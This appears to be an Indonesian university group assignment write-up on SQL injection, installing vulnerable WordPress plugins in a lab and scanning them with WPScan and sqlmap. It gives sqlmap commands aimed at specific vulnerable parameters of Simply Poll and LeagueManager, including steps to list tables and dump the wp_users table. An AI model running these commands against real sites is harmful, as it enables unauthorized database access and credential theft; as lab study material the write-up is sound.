# Tugas 2 - SQL Injection

#### Anggota Kelompok
- Tionia Rizkika (5114100053)
- Destiana Nurliasari (5114100148)
- Afifah Asmar Sari (5114100154)

- - - -

## Pendahuluan
SQL Injection adalah salah satu teknik peretasan dengan menyalahgunakan sebuah celah keamanan yang terjadi dalam lapisan basis data dari suatu aplikasi. Pelaku penyerangan dapat menginsertkan perintah-perintah SQL melalui URL untuk dieksekusi oleh database. Dengan SQL Injection, penyerang dapat memperoleh list database dan tabel-tabel yang ada pada database target. Bahkan, penyerang juga dapat  melakukan login tanpa harus memiliki akun.

## Dasar Teori

### OS yang Digunakan

#### Ubuntu Desktop
Ubuntu merupakan salah satu distribusi Linux yang berbasiskan Debian dan didistribusikan sebagai software bebas. Ubuntu Desktop ditujukan untuk user yang memakai Ubuntu sebagai end user. Pada Ubuntu Desktop telahterinstall beberapa aplikasi, diantaranya: LibreOffice, Mozilla Firefox, dan Mozilla Thunderbird. Ubuntu Desktop mengompile paket menggunakan fitur gcc seperti PIE dan proteksi Buffer Overflow untuk memproteksi software.

### Wordpress Plugin yang Digunakan

#### 1. VideoPlayer 1.5.16
Merupakan Plugin yang digunakan untuk menambahkan video pada Wordpress website. Pada plugin ini terdapat fitur untuk membuat playlist video, mengatur layout dan tampilan dari player dan terintegrasi dengan beberapa media sosial (Facebook, Google+ dan Twitter). Plugin ini dapat diunduh pada https://wordpress.org/plugins/player/

#### 2. LeagueManager 3.9.1.1
Merupakan plugin yang digunakan untuk mengatur dan menampilkan hasil dari pertandingan olahraga pada Wordpress website. Plugin ini dapat diunduh pada https://wordpress.org/plugins/leaguemanager/

#### 3. Simply Poll 1.4.1
Merupakan plugin yang digunakan untuk membuat poll pada Wordpress website. Poll yang dibuat dapat ditampilkan pada sidebar, post, maupun pages dari website. Plugin ini dapat diunduh pada https://wordpress.org/plugins/simply-polls/

### Tools yang Digunakan

#### 1. WPScan
Merupakan tools untuk melihat celah keamanan dari seluruh plugin dan theme yang digunakan pada Wordpress website. Tools ini dibuat menggunakan bahasa ruby.

#### 2. sqlmap
Merupakan tools opensource yang mendeteksi dan melakukan exploit pada bug SQL injection secara otomatis. dengan melakukan serangan SQL injection seorang attacker dapat mengambil alih serta memanipulasi sebuah database di dalam sebuah server.

## Instalasi

### Langkah Instalasi Wordpress
- Download Wordpress dari alamat: <pre>https://wordpress.org/download/</pre>
- Extract hasil file hasil dari download pada directori home, bila menggunakan OS Windows dan XAMPP maka directori default ada pada: <pre>C:\xampp\htdocs\ </pre>
- (Opsional) Rename folder hasil extract bila diperlukan.
- Buka file **'wp-config-sample.php'** menggunakan text-editor, ubah pengaturan database sesuai dengan kehendak:
![atur database](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wp-configPNG.PNG)
- Untuk mengubah url, tambahkan: <pre>
define('WP_HOME',    'http://alamatip/nama_folder');
define('WP_SITEURL', 'http://alamatip/nama_folder');
</pre>

- Simpan dan ubah nama menjadi **'wp-config.php'**.
- Pada browser buka url yang telah di inputkan sebelumnya pada **'wp-config.php'**, seperti: <pre>
http://192.168.100.19/wordpress/ -> (http://alamatip/nama_folder)
</pre> dike

- Pilih bahasa instalasi:

![pilih bahasa](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/step1.PNG)

- Input data user dan web:

![data user](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/step2.PNG)

- Instalasi wordpress telah selesai, untuk menggunakan mengatur wordpress login dengan mengklik button 'Login' atau pada alamat:<pre>http://alamatip/nama_folder/wp-login/ </pre>

![instalasi](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/step3.PNG)

### Langkah Instalasi Wordpress Plugin

- Masuk pada halaman pengaturan wordpress melalui: <pre>http://alamatip/nama_folder/wp-login/ </pre>
- Pilih tab plugin.

![tab plugin](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/plugin1.PNG)

- Pilih 'Add New'.
- Pilih plugin yang dikehendaki untuk diinstal atau bila telah memiliki file plugin, maka pilih 'Upload File'.

![upload file](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/plugin2.PNG)

- Pilih 'Choose File' untuk memilih plugin yang tersimpan secara lokal. Kemudian pilih 'Install Now'.

![choose file](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/plugin3.PNG)

- Instalasi plugin akan berjalan. Plugin telah berhasil di install.

![instalasi selesai](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/plugin4.PNG)

## Uji Coba

### WPScan

- Buka terminal pada folder dimana wpscan berada, jalankan perintah:<pre>
ruby wpscan.rb --url alamat_site  --enumerate vp
</pre>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Parameter  `vp`  pada  `--enumerate`  untuk memunculkan hasil plugin yang vulnerable.

- Hasil dari WPScan:

![hasil 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscanrun1.png)
![hasil 2](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscanresult1.png)
![hasil 3](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%202.png)
![hasil 4](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%203.png)
![hasil 5](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%204.png)
![hasil 6](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%205.png)
![hasil 7](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%206.png)
![hasil 8](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%207.png)

### sqlmap

#### Plugin - Simply Poll 1.4.1
- Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=spAjaxResult&&pollid=iddaripoll" --dbms=mysql --level=5 --risk=3
</pre>

![simplypol 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll1.png)
![simplypol 2](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll2.png)
![simplypol 3](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll3.png)

- Dari hasil sebelumnya telah didapatkan parameter yang vurnable, untuk mendapatkan list table yang terdapat di databasa sasaran maka tambahkan `-p pollid --tables` pada perintah dan jalankan. Hasil:

![simplypol 4](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll4.png)
![simplypol 5](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll5.png)
![simplypol 6](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll6.png)
![simplypol 7](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll7.png)
![simplypol 8](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll8.png)

- Dari hasil sebelumnya didapatkan list database dan table yang ada pada server. Untuk mendapatkan isi tabel wp_users dari database wordpress, maka tambahkan `-D wordpress -T wp_users` pada perintah dan jalankan. Hasil:

![simplypol 9](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll9.png)
![simplypol 10](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll10.png)

#### Plugin - League Manager 3.9.11
- Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
python sqlmap.py --url "http://alamat_site?match=1" --level 5 --risk 3 --dbms mysql --tables
</pre>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:

![leaguemanager 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables1.png)
![leaguemanager 2](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables2.png)
![leaguemanager 3](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables3.png)
![leaguemanager 4](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables4.png)
![leaguemanager 5](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables5.png)
![leaguemanager 6](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables6.png)

- atau:<pre>
python sqlmap.py --url "http://alamat_site?league_id=1&season=Winter" --level 5 --risk 3 --dbms mysql --tables
</pre>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:

## Kesimpulan dan Saran

### Kesimpulan

### Saran


